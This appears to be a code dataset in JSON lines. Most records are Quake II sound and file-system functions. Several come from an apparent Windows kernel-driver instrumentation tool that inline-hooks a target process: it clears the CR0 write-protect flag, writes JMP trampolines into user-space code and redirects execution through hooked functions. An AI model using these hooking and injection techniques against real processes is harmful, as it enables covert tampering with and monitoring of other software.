{"docstring": "/*\n===============\nS_IssuePlaysound\n\nTake the next playsound and begin it on the channel\nThis is never called directly by S_Play*, but only\nby the update loop.\n===============\n*/\n", "func_signal": "void S_IssuePlaysound (playsound_t *ps)", "code": "{\n\tchannel_t\t*ch;\n\tsfxcache_t\t*sc;\n\n\tif (s_show->value)\n\t\tCom_Printf (\"Issue %i\\n\", ps->begin);\n\t// pick a channel to play on\n\tch = S_PickChannel(ps->entnum, ps->entchannel);\n\tif (!ch)\n\t{\n\t\tS_FreePlaysound (ps);\n\t\treturn;\n\t}\n\n\t// spatialize\n\tif (ps->attenuation == ATTN_STATIC)\n\t\tch->dist_mult = ps->attenuation * 0.001;\n\telse\n\t\tch->dist_mult = ps->attenuation * 0.0005;\n\tch->master_vol = ps->volume;\n\tch->entnum = ps->entnum;\n\tch->entchannel = ps->entchannel;\n\tch->sfx = ps->sfx;\n\tVectorCopy (ps->origin, ch->origin);\n\tch->fixed_origin = ps->fixed_origin;\n\n\tS_Spatialize(ch);\n\n\tch->pos = 0;\n\tsc = S_LoadSound (ch->sfx);\n    ch->end = paintedtime + sc->length;\n\n\t// free the playsound\n\tS_FreePlaysound (ps);\n}", "path": "client\\snd_dma.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n=================\nS_Spatialize\n=================\n*/\n", "func_signal": "void S_Spatialize(channel_t *ch)", "code": "{\n\tvec3_t\t\torigin;\n\n\t// anything coming from the view entity will always be full volume\n\tif (ch->entnum == cl.playernum+1)\n\t{\n\t\tch->leftvol = ch->master_vol;\n\t\tch->rightvol = ch->master_vol;\n\t\treturn;\n\t}\n\n\tif (ch->fixed_origin)\n\t{\n\t\tVectorCopy (ch->origin, origin);\n\t}\n\telse\n\t\tCL_GetEntitySoundOrigin (ch->entnum, origin);\n\n\tS_SpatializeOrigin (origin, ch->master_vol, ch->dist_mult, &ch->leftvol, &ch->rightvol);\n}", "path": "client\\snd_dma.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n=============\nFS_ExecAutoexec\n=============\n*/\n", "func_signal": "void FS_ExecAutoexec (void)", "code": "{\n\tchar *dir;\n\tchar name [MAX_QPATH];\n\n\tdir = Cvar_VariableString(\"gamedir\");\n\tif (*dir)\n\t\tCom_sprintf(name, sizeof(name), \"%s/%s/autoexec.cfg\", fs_basedir->string, dir); \n\telse\n\t\tCom_sprintf(name, sizeof(name), \"%s/%s/autoexec.cfg\", fs_basedir->string, BASEDIRNAME); \n\tif (Sys_FindFirst(name, 0, SFF_SUBDIR | SFF_HIDDEN | SFF_SYSTEM))\n\t\tCbuf_AddText (\"exec autoexec.cfg\\n\");\n\tSys_FindClose();\n}", "path": "qcommon\\files.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n** FS_ListFiles\n*/\n", "func_signal": "char **FS_ListFiles( char *findname, int *numfiles, unsigned musthave, unsigned canthave )", "code": "{\n\tchar *s;\n\tint nfiles = 0;\n\tchar **list = 0;\n\n\ts = Sys_FindFirst( findname, musthave, canthave );\n\twhile ( s )\n\t{\n\t\tif ( s[strlen(s)-1] != '.' )\n\t\t\tnfiles++;\n\t\ts = Sys_FindNext( musthave, canthave );\n\t}\n\tSys_FindClose ();\n\n\tif ( !nfiles )\n\t\treturn NULL;\n\n\tnfiles++; // add space for a guard\n\t*numfiles = nfiles;\n\n\tlist = malloc( sizeof( char * ) * nfiles );\n\tmemset( list, 0, sizeof( char * ) * nfiles );\n\n\ts = Sys_FindFirst( findname, musthave, canthave );\n\tnfiles = 0;\n\twhile ( s )\n\t{\n\t\tif ( s[strlen(s)-1] != '.' )\n\t\t{\n\t\t\tlist[nfiles] = strdup( s );\n#ifdef _WIN32\n\t\t\tstrlwr( list[nfiles] );\n#endif\n\t\t\tnfiles++;\n\t\t}\n\t\ts = Sys_FindNext( musthave, canthave );\n\t}\n\tSys_FindClose ();\n\n\treturn list;\n}", "path": "qcommon\\files.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n=================\nS_AllocPlaysound\n=================\n*/\n", "func_signal": "playsound_t *S_AllocPlaysound (void)", "code": "{\n\tplaysound_t\t*ps;\n\n\tps = s_freeplays.next;\n\tif (ps == &s_freeplays)\n\t\treturn NULL;\t\t// no free playsounds\n\n\t// unlink from freelist\n\tps->prev->next = ps->next;\n\tps->next->prev = ps->prev;\n\t\n\treturn ps;\n}", "path": "client\\snd_dma.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n================\nFS_Link_f\n\nCreates a filelink_t\n================\n*/\n", "func_signal": "void FS_Link_f (void)", "code": "{\n\tfilelink_t\t*l, **prev;\n\n\tif (Cmd_Argc() != 3)\n\t{\n\t\tCom_Printf (\"USAGE: link <from> <to>\\n\");\n\t\treturn;\n\t}\n\n\t// see if the link already exists\n\tprev = &fs_links;\n\tfor (l=fs_links ; l ; l=l->next)\n\t{\n\t\tif (!strcmp (l->from, Cmd_Argv(1)))\n\t\t{\n\t\t\tZ_Free (l->to);\n\t\t\tif (!strlen(Cmd_Argv(2)))\n\t\t\t{\t// delete it\n\t\t\t\t*prev = l->next;\n\t\t\t\tZ_Free (l->from);\n\t\t\t\tZ_Free (l);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tl->to = CopyString (Cmd_Argv(2));\n\t\t\treturn;\n\t\t}\n\t\tprev = &l->next;\n\t}\n\n\t// create a new link\n\tl = Z_Malloc(sizeof(*l));\n\tl->next = fs_links;\n\tfs_links = l;\n\tl->from = CopyString(Cmd_Argv(1));\n\tl->fromlength = strlen(l->from);\n\tl->to = CopyString(Cmd_Argv(2));\n}", "path": "qcommon\\files.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n=================\nS_SpatializeOrigin\n\nUsed for spatializing channels and autosounds\n=================\n*/\n", "func_signal": "void S_SpatializeOrigin (vec3_t origin, float master_vol, float dist_mult, int *left_vol, int *right_vol)", "code": "{\n    vec_t\t\tdot;\n    vec_t\t\tdist;\n    vec_t\t\tlscale, rscale, scale;\n    vec3_t\t\tsource_vec;\n\n\tif (cls.state != ca_active)\n\t{\n\t\t*left_vol = *right_vol = 255;\n\t\treturn;\n\t}\n\n// calculate stereo seperation and distance attenuation\n\tVectorSubtract(origin, listener_origin, source_vec);\n\n\tdist = VectorNormalize(source_vec);\n\tdist -= SOUND_FULLVOLUME;\n\tif (dist < 0)\n\t\tdist = 0;\t\t\t// close enough to be at full volume\n\tdist *= dist_mult;\t\t// different attenuation levels\n\t\n\tdot = DotProduct(listener_right, source_vec);\n\n\tif (dma.channels == 1 || !dist_mult)\n\t{ // no attenuation = no spatialization\n\t\trscale = 1.0;\n\t\tlscale = 1.0;\n\t}\n\telse\n\t{\n\t\trscale = 0.5 * (1.0 + dot);\n\t\tlscale = 0.5*(1.0 - dot);\n\t}\n\n\t// add in distance effect\n\tscale = (1.0 - dist) * rscale;\n\t*right_vol = (int) (master_vol * scale);\n\tif (*right_vol < 0)\n\t\t*right_vol = 0;\n\n\tscale = (1.0 - dist) * lscale;\n\t*left_vol = (int) (master_vol * scale);\n\tif (*left_vol < 0)\n\t\t*left_vol = 0;\n}", "path": "client\\snd_dma.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n============\nFS_Path_f\n\n============\n*/\n", "func_signal": "void FS_Path_f (void)", "code": "{\n\tsearchpath_t\t*s;\n\tfilelink_t\t\t*l;\n\n\tCom_Printf (\"Current search path:\\n\");\n\tfor (s=fs_searchpaths ; s ; s=s->next)\n\t{\n\t\tif (s == fs_base_searchpaths)\n\t\t\tCom_Printf (\"----------\\n\");\n\t\tif (s->pack)\n\t\t\tCom_Printf (\"%s (%i files)\\n\", s->pack->filename, s->pack->numfiles);\n\t\telse\n\t\t\tCom_Printf (\"%s\\n\", s->filename);\n\t}\n\n\tCom_Printf (\"\\nLinks:\\n\");\n\tfor (l=fs_links ; l ; l=l->next)\n\t\tCom_Printf (\"%s : %s\\n\", l->from, l->to);\n}", "path": "qcommon\\files.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n================\nFS_NextPath\n\nAllows enumerating all of the directories in the search path\n================\n*/\n", "func_signal": "char *FS_NextPath (char *prevpath)", "code": "{\n\tsearchpath_t\t*s;\n\tchar\t\t\t*prev;\n\n\tif (!prevpath)\n\t\treturn fs_gamedir;\n\n\tprev = fs_gamedir;\n\tfor (s=fs_searchpaths ; s ; s=s->next)\n\t{\n\t\tif (s->pack)\n\t\t\tcontinue;\n\t\tif (prevpath == prev)\n\t\t\treturn s->filename;\n\t\tprev = s->filename;\n\t}\n\n\treturn NULL;\n}", "path": "qcommon\\files.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n============\nFS_LoadFile\n\nFilename are reletive to the quake search path\na null buffer will just return the file length without loading\n============\n*/\n", "func_signal": "int FS_LoadFile (char *path, void **buffer)", "code": "{\n\tFILE\t*h;\n\tbyte\t*buf;\n\tint\t\tlen;\n\n\tbuf = NULL;\t// quiet compiler warning\n\n// look for it in the filesystem or pack files\n\tlen = FS_FOpenFile (path, &h);\n\tif (!h)\n\t{\n\t\tif (buffer)\n\t\t\t*buffer = NULL;\n\t\treturn -1;\n\t}\n\t\n\tif (!buffer)\n\t{\n\t\tfclose (h);\n\t\treturn len;\n\t}\n\n\tbuf = Z_Malloc(len);\n\t*buffer = buf;\n\n\tFS_Read (buf, len, h);\n\n\tfclose (h);\n\n\treturn len;\n}", "path": "qcommon\\files.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n==================\nS_ClearBuffer\n==================\n*/\n", "func_signal": "void S_ClearBuffer (void)", "code": "{\n\tint\t\tclear;\n\t\t\n\tif (!sound_started)\n\t\treturn;\n\n\ts_rawend = 0;\n\n\tif (dma.samplebits == 8)\n\t\tclear = 0x80;\n\telse\n\t\tclear = 0;\n\n\tSNDDMA_BeginPainting ();\n\tif (dma.buffer)\n\t\tmemset(dma.buffer, clear, dma.samples * dma.samplebits/8);\n\tSNDDMA_Submit ();\n}", "path": "client\\snd_dma.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n================\nFS_AddGameDirectory\n\nSets fs_gamedir, adds the directory to the head of the path,\nthen loads and adds pak1.pak pak2.pak ... \n================\n*/\n", "func_signal": "void FS_AddGameDirectory (char *dir)", "code": "{\n\tint\t\t\t\ti;\n\tsearchpath_t\t*search;\n\tpack_t\t\t\t*pak;\n\tchar\t\t\tpakfile[MAX_OSPATH];\n\n\tstrcpy (fs_gamedir, dir);\n\n\t//\n\t// add the directory to the search path\n\t//\n\tsearch = Z_Malloc (sizeof(searchpath_t));\n\tstrcpy (search->filename, dir);\n\tsearch->next = fs_searchpaths;\n\tfs_searchpaths = search;\n\n\t//\n\t// add any pak files in the format pak0.pak pak1.pak, ...\n\t//\n\tfor (i=0; i<10; i++)\n\t{\n\t\tCom_sprintf (pakfile, sizeof(pakfile), \"%s/pak%i.pak\", dir, i);\n\t\tpak = FS_LoadPackFile (pakfile);\n\t\tif (!pak)\n\t\t\tcontinue;\n\t\tsearch = Z_Malloc (sizeof(searchpath_t));\n\t\tsearch->pack = pak;\n\t\tsearch->next = fs_searchpaths;\n\t\tfs_searchpaths = search;\t\t\n\t}\n\n\n}", "path": "qcommon\\files.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "/*\n=================\nFS_LoadPackFile\n\nTakes an explicit (not game tree related) path to a pak file.\n\nLoads the header and directory, adding the files at the beginning\nof the list so they override previous pack files.\n=================\n*/\n", "func_signal": "pack_t *FS_LoadPackFile (char *packfile)", "code": "{\n\tdpackheader_t\theader;\n\tint\t\t\t\ti;\n\tpackfile_t\t\t*newfiles;\n\tint\t\t\t\tnumpackfiles;\n\tpack_t\t\t\t*pack;\n\tFILE\t\t\t*packhandle;\n\tdpackfile_t\t\tinfo[MAX_FILES_IN_PACK];\n\tunsigned\t\tchecksum;\n\n\tpackhandle = fopen(packfile, \"rb\");\n\tif (!packhandle)\n\t\treturn NULL;\n\n\tfread (&header, 1, sizeof(header), packhandle);\n\tif (LittleLong(header.ident) != IDPAKHEADER)\n\t\tCom_Error (ERR_FATAL, \"%s is not a packfile\", packfile);\n\theader.dirofs = LittleLong (header.dirofs);\n\theader.dirlen = LittleLong (header.dirlen);\n\n\tnumpackfiles = header.dirlen / sizeof(dpackfile_t);\n\n\tif (numpackfiles > MAX_FILES_IN_PACK)\n\t\tCom_Error (ERR_FATAL, \"%s has %i files\", packfile, numpackfiles);\n\n\tnewfiles = Z_Malloc (numpackfiles * sizeof(packfile_t));\n\n\tfseek (packhandle, header.dirofs, SEEK_SET);\n\tfread (info, 1, header.dirlen, packhandle);\n\n// crc the directory to check for modifications\n\tchecksum = Com_BlockChecksum ((void *)info, header.dirlen);\n\n#ifdef NO_ADDONS\n\tif (checksum != PAK0_CHECKSUM)\n\t\treturn NULL;\n#endif\n// parse the directory\n\tfor (i=0 ; i<numpackfiles ; i++)\n\t{\n\t\tstrcpy (newfiles[i].name, info[i].name);\n\t\tnewfiles[i].filepos = LittleLong(info[i].filepos);\n\t\tnewfiles[i].filelen = LittleLong(info[i].filelen);\n\t}\n\n\tpack = Z_Malloc (sizeof (pack_t));\n\tstrcpy (pack->filename, packfile);\n\tpack->handle = packhandle;\n\tpack->numfiles = numpackfiles;\n\tpack->files = newfiles;\n\t\n\tCom_Printf (\"Added packfile %s (%i files)\\n\", packfile, numpackfiles);\n\treturn pack;\n}", "path": "qcommon\\files.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "// ====================================================================\n// User-setable variables\n// ====================================================================\n", "func_signal": "void S_SoundInfo_f(void)", "code": "{\n\tif (!sound_started)\n\t{\n\t\tCom_Printf (\"sound system not started\\n\");\n\t\treturn;\n\t}\n\t\n    Com_Printf(\"%5d stereo\\n\", dma.channels - 1);\n    Com_Printf(\"%5d samples\\n\", dma.samples);\n    Com_Printf(\"%5d samplepos\\n\", dma.samplepos);\n    Com_Printf(\"%5d samplebits\\n\", dma.samplebits);\n    Com_Printf(\"%5d submission_chunk\\n\", dma.submission_chunk);\n    Com_Printf(\"%5d speed\\n\", dma.speed);\n    Com_Printf(\"0x%x dma buffer\\n\", dma.buffer);\n}", "path": "client\\snd_dma.c", "repo_name": "idsoftware/quake2", "stars": 58, "license": "None", "language": "c", "size": 1255}
{"docstring": "//-----------------------------------------------------------------------------\n// Target process is loaded in memory - now data mine it\n//-----------------------------------------------------------------------------\n", "func_signal": "VOID add_hooks_for_data_mining(PUNICODE_STRING name, HANDLE PID,\n\t                           PIMAGE_INFO image_info)", "code": "{\n\tUNICODE_STRING target_proc;\n\n\tif (!name)\n\t{\n\t\tDbgPrint(\"\\n!!! ERROR: add_hooks_for_data_mining() invalid ptr to name \\n\");\n\t\treturn;\n\t}\n\n\tRtlInitUnicodeString(&target_proc, target_file_loc);\n\n\tif (RtlCompareUnicodeString(name, &target_proc, TRUE) == 0)\n\t{\n\t\tint image_sz = IMAGE_SZ;\n\t\tunsigned int *start_addr = START_ADDR;\n\n\t\tdebug(\"targeted process got loaded - our callback was invoked\\n\");\n\t\tdebug(\"\\t add function hooks to target process\\n\");\n\n\t\t// routine allocates a memory descriptor list (MDL) \n\t\tmdl_user_proc = IoAllocateMdl(start_addr, image_sz, FALSE, FALSE, NULL);\n\t\tif (!mdl_user_proc)\n\t\t{\n\t\t\tDbgPrint(\"\\n!!! ERROR: invalid mdl in add_hooks_for_data_mining()\\n\");\n\t\t\treturn;\n\t\t}\n\t\tMmProbeAndLockPages(mdl_user_proc, KernelMode, IoReadAccess);\n\n\t\t//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\t\t//\n\t\t// ADD HOOKED CODE HERE\n\t\t//\n\t\t//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\t\ttarget_foo2 = (int (__cdecl *)(int))0x409870;\n\t\treroute_function(target_foo2, hooked_foo2);\n\t\t\n\t\ttarget_foo4 = (int (__cdecl *)(int, int))0x4098B0;\n\t\treroute_function(target_foo4, hooked_foo4);\n\n\t\t// copy shared memory function to shared user space memory\n\t\tCLEAR_WP_FLAG;\n\t\tRtlCopyMemory((PVOID)shared_kern_mem, shared_mem_data_mining, \n\t\t\t           SIZE_OF_SHARED_MEM);\n\t\tRESTORE_CR0;\n\n\t\tif (mdl_user_proc)\n\t\t{\n\t\t\tMmUnlockPages(mdl_user_proc);\n\t\t\tIoFreeMdl(mdl_user_proc);\n\t\t}\n\t}\n}", "path": "data_miner_hooks.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n//                 \n//                STACK  (Low)\n//               -------\n//               | ID  | <- Identifier (User Hooked Function Addr)\n//               | EFG | <- EFLAGS\n//  gORIG_ESP -> | EDI |\n//               | ESI |\n//               | EBP |\n//               | ESP |\n//               | EBX |\n//               | EDX |\n//               | ECX |\n//               | EAX | (High)\n//               | RET | <- Return address of the caller (Orig. stack frame before invokation of function)\n//               -------\n//-----------------------------------------------------------------------------\n", "func_signal": "void handle_hooked_calls()", "code": "{\n\tunsigned int hooked_call = 0;\n\n\tsave_context();\n\n\tdebug(\"0x%X targeted function exec.  Reroute to our hooked code\\n\", gID);\n\thooked_call = get_hooked_call_addr();\n\n\tif (hooked_call == 0)\n\t{\n\t\tDbgPrint(\"\\n!!! ERROR: Invalid hooked_call in handle_hooked_calls()\\n\");\n\t\treturn;\n\t}\n\n\t// adjust stack - Just bypass the registers that have been pushed on the \n\t// stack and get the stack pointer to point to the return address that \n\t// was pushed on the caller\n\t_asm\n\t{\n\t\tmov eax, gORIG_ESP\n\t\tadd eax, 0x20  /* Change esp to point to the \"RET\" on the stack */\n\t\tmov esp, eax\n\t\tjmp hooked_call\n\t}\n}", "path": "data_miner.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// Hooked functions\n//-----------------------------------------------------------------------------\n", "func_signal": "void __cdecl hooked_foo2(int a)", "code": "{\n\tDbgPrint(\"hooked_foo2(%X)\\n\", a);\n\tdebug(\"restore context\\n\");\n\tdebug(\"let go\\n\");\n\n\trestore_context_switch_dm();\n\n\t_asm\n\t{\n\t\t// Execute stolen bytes\n\t\t_emit 0x55                //push ebp\n\t\t_emit 0x8B                //mov ebp, esp\n\t\t_emit 0xEC\n\t\t_emit 0x8B                //mov eax, dword ptr [ebp+8]\n\t\t_emit 0x45\n\t\t_emit 0x08\n\n\t\t// Jump to user process\n\t\tadd gID, 6\n\n\t\t// Restore the eflags\n\t\tpush gDM_EFLAGS\n\t\tpopfd\n\n\t\tjmp gID\n\t}\n}", "path": "data_miner_hooks.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------------------------------------------------------\n// MainCRTStartup code - must be hooked first\n//-----------------------------------------------------------------------------------------------------------------------------\n", "func_signal": "int  Mine___tmainCRTStartup(void)", "code": "{\n\tDbgPrint(\" [[[ %X ]]] \\n \", gCallerRet);\n\t\n\tDbgPrint(\"__tmainCRTStartup (void)\\n\");\n\n\t    //++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\t    // Added DLL hooked code here\n\t    //++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\t\tReal__GetCommandLineA = (int ( *)(void))0x7C812C8D;\n\t\tadd_RerouteCode_OGA(Real__GetCommandLineA, Mine__GetCommandLineA);\n\n\t restore_context_switch_OGA();\n\n\t _asm { \n\t add gID, 7\n\n\t // Restore the eflags\n\t push gDM_EFLAGS\n\t popfd\n\t _emit 0x6A\n\t _emit 0x1C\n\t _emit 0x68\n\t _emit 0xF0\n\t _emit 0xE6\n\t _emit 0x40\n\t _emit 0x0\n\n\t jmp gID\n\t}\n}", "path": "HowToHookDLLCode.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// This function is used for the driver debugger, adjusts the stack and jumps \n// back to the user process\n//-----------------------------------------------------------------------------\n", "func_signal": "void __declspec(naked) _cdecl return_to_user_app()", "code": "{\n\t_asm\n\t{\n\t\t// since the gORIG_ESP is not the real orignal ESP I need to adjust it\n\t\t// to really be pointing to the real stack before restoring registers \n\t\t// and changing control back to the debuggee\n\t\tmov eax, gORIG_ESP\n\t\tsub eax, 8 \n\n\t\t// now adjust the stack pointer to point to were it was\n\t\tmov esp, eax\n\n\t\tpop eax  // this is the BP\n\t\tpopad    // pop all registers that were stored on the stack in  \n\t\t         // shared_mem()\n\n\t\tjmp gEIP\n\t}\n}", "path": "debugger.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// Reroute functions in a user space process\n//-----------------------------------------------------------------------------\n", "func_signal": "int reroute_function(void *orig_func, void *hooked_func)", "code": "{\n\tstatic int offset = 0;\n\tstatic int idx = 0;\n\tunsigned int jmp_mine = 0;\n\tunsigned int jmp_shared = 0; \n\n\tif (!orig_func || !hooked_func)\n\t{\n\t\tDbgPrint(\"\\n!!! ERROR: Invalid ptr in reroute_function()\\n\\n\");\n\t\treturn FALSE;\n\t}\n\n\tdebug(\"rerouting target function %p -> %p\\n\", orig_func, hooked_func);\n\n\t// Dest - CurrentAddr - SizeJump\n\t//\n\t// NOTE: Why offset?  Look at function shared_mem_data_mining()...\n\t// There are 0xC bytes offset for each hooked function\n\t// that the user process needs to jump to in shared memory space.  Just \n\t// make sure that the order of the hooked functions is important\n\tif (offset != 0)\n\t{\n\t\tjmp_shared = (shared_user_mem + offset) - \n\t\t\t         (unsigned int)orig_func - SIZE_OF_JMP;\n\t}\n\telse\n\t{\n\t\tjmp_shared = shared_user_mem - (unsigned int)orig_func - SIZE_OF_JMP;\n\t}\n\n\toffset += TRAMPOLINE_OFFSET;\n\t\n\tjmp_op[0] = 0xE9;\n\tmemcpy(jmp_op+1, &jmp_shared, SIZE_OF_JMP);\n\n\t// inject jmp into user space (reroute instruction pointer)\n\tCLEAR_WP_FLAG;\n\tRtlCopyMemory(orig_func, jmp_op, SIZE_OF_JMP);\n\tRESTORE_CR0;\n\n\t// save off the hooked function addresses\n\tif (idx < MAX_ARRAY_HOOKED_CALLS)\n\t{\n\t\tarray_hooked_calls[0][idx] = (unsigned int)orig_func;\n\t\tarray_hooked_calls[1][idx] = (unsigned int)hooked_func;\n\t\tidx++;\n\t}\n\telse\n\t\tDbgPrint(\"\\n!!! ERROR: MAX_ARRAY_HOOKED_CALLS exceeded\\n\");\n\n\treturn TRUE;\n}", "path": "data_miner.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// Target process loaded - this callback works well, however, if you \n// unload the driver it will cause a blue screen\n//-----------------------------------------------------------------------------\n", "func_signal": "VOID add_one_time_bp(PUNICODE_STRING name, HANDLE PID, PIMAGE_INFO image_info)", "code": "{\n\tunsigned int endian = 0;\n\tunsigned int addr = BP1;  \n\tUNICODE_STRING targ_proc;\n\n\tif (!name)\n\t{\n\t\tDbgPrint(\"\\n!!! ERROR: add_hooks_for_data_mining() invalid name \\n\");\n\t\treturn;\n\t}\n\n\tbreakpoint = (unsigned int) addr;\n\n\tRtlInitUnicodeString(&targ_proc, target_file_loc);\n\n\tif (RtlCompareUnicodeString(name, &targ_proc, TRUE) == 0)\n\t{\n\t\tdebug(\"targeted process got loaded - our callback was invoked\\n\");\n\t\tdebug(\"\\t add a one time bp to target process\\n\");\n\t\tdebug(\"\\t before memory bp = \");\n\t\tprint_memory((unsigned int *)addr , 5);\n\t\t\n\t\tadd_bp();\n\n\t\tdebug(\"\\t stolen bytes = \");\n\t\tprint_memory(stolen_code, 5);\n\n\t\tdebug(\"bp successfully added to user land at 0x%X\\n\\n\", \n\t\t\t     breakpoint);\n\n\t\tdebug(\"let go\\n\\n\");\n\t}\n}", "path": "debugger.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// Saved off registers and assigned an address to the registers.  Use that \n// address to save off the changed register\n//-----------------------------------------------------------------------------\n", "func_signal": "void modify_register(int reg, int value)", "code": "{\n\tint badptr = 0;\n\n\tswitch (reg) \n\t{\n\tcase EAX_ID: \n\t\tif (g_EAX_ADDR) *g_EAX_ADDR = value;\n\t\telse             badptr = 1;\n\t\tbreak;\n\tcase EBX_ID: \n\t\tif (g_EBX_ADDR) *g_EBX_ADDR = value;\n\t\telse             badptr = 1;\n\t\tbreak;\n\tcase ECX_ID: \n\t\tif (g_ECX_ADDR) *g_ECX_ADDR = value;\n\t\telse             badptr = 1;\n\t\tbreak;\n\tcase EDX_ID: \n\t\tif (g_EDX_ADDR) *g_EDX_ADDR = value;\n\t\telse             badptr = 1;\n\t\tbreak;\n\tcase ESI_ID: \n\t\tif (g_ESI_ADDR) *g_ESI_ADDR = value;\n\t\telse             badptr = 1;\n\t\tbreak;\n\tcase EDI_ID: \n\t\tif (g_EDI_ADDR) *g_EDI_ADDR = value;\n\t\telse             badptr = 1;\n\t\tbreak;\n\tcase EBP_ID: \n\t\tif (g_EBP_ADDR) *g_EBP_ADDR = value;\n\t\telse             badptr = 1;\n\t\tbreak;\n\tcase ESP_ID: \n\t\tif (g_ESP_ADDR) *g_ESP_ADDR = value;\n\t\telse             badptr = 1;\n\t\tbreak;\n\tdefault:\n\t\tDbgPrint(\"internal Error modify_register() - No matching register\");\n\t\tbreak;\n\t}\n\n\tif (badptr) \n\t\tDbgPrint(\"\\n!!! ERROR: Bad Address - modify_register()\");\n}", "path": "debugger.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// Print memory to DebugView\n//-----------------------------------------------------------------------------\n", "func_signal": "int print_memory(unsigned int *addr, int bytes)", "code": "{\n\tunsigned char buf[100] = {0};\n\tint num_bytes;\n\n\tmemcpy(buf, addr, bytes);\n\n\t//DbgPrint(\"MEMORY READ @ %p - bytes %d\\n\", addr, bytes);\n\n\tfor (num_bytes = 0; num_bytes < bytes; num_bytes += 5)\n\t\tdebug(\"%.2X %.2X %.2X %.2X %.2X\\n\", buf[num_bytes],\n\t\t                                    buf[num_bytes+1], \n\t\t\t\t\t\t\t\t\t\t\tbuf[num_bytes+2], \n\t\t\t\t\t\t\t\t\t\t\tbuf[num_bytes+3], \n\t\t\t\t\t\t\t\t\t\t\tbuf[num_bytes+4]);\n\n\n\treturn TRUE;\n}", "path": "support.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// Find and return the hooked call address\n//-----------------------------------------------------------------------------\n", "func_signal": "unsigned int get_hooked_call_addr()", "code": "{\n\tunsigned int hooked_call = 0;\n\tint i = 0;\n\n\tfor (i = 0; i < MAX_ARRAY_HOOKED_CALLS; i++)\n\t{\n\t\tif (array_hooked_calls[0][i] == gID)\n\t\t{\n\t\t\thooked_call = array_hooked_calls[1][i];\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn hooked_call;\n}", "path": "data_miner.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// Print out a memory range in dwords to file\n//-----------------------------------------------------------------------------\n", "func_signal": "void print_memory_range_file(int beginAddr, int num_dwords)", "code": "{\n\tint j = 0;\n\tint i = 0;\n\tchar *ptrByte;\n\tint *ptrMem;\n\tint dwords = 0;\n\tint hexval[4] = {0};\n\tchar ascval[4][4] = {0};\n\n\tptrMem = (int *)beginAddr;\n\n\tDbgPrint( \"---- Begin Memory Dump ----\\n\");\n\n\tfor (dwords = 0; dwords < num_dwords; dwords += 4)\n\t{\n\t\tfor (i = 0; i < 4; i++)\n\t\t{\n\t\t\thexval[i] = *ptrMem;\n\t\t\tfor (j = 0; j < 4; j++)\n\t\t\t{\n\t\t\t\tptrByte = (char *)ptrMem;\n\t\t\t\tif (*ptrByte != 0x0a && *ptrByte+1 != 0)\n\t\t\t\t\tascval[i][j] = *ptrByte;\n\t\t\t\telse\n\t\t\t\t\tascval[i][j] = ' ';\n\t\t\t\tptrByte++;\n\t\t\t}\n\t\t\tptrMem++;\n\t\t}\n\n\t\tDbgPrint(\"%08.4X %08.4X %08.4X %08.4X\\n\", hexval[0], hexval[1], \n\t\t\t                                      hexval[2], hexval[3]);\n\t}\n\n\tDbgPrint( \"---- End Memory Dump ----\\n\");\n}", "path": "support.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
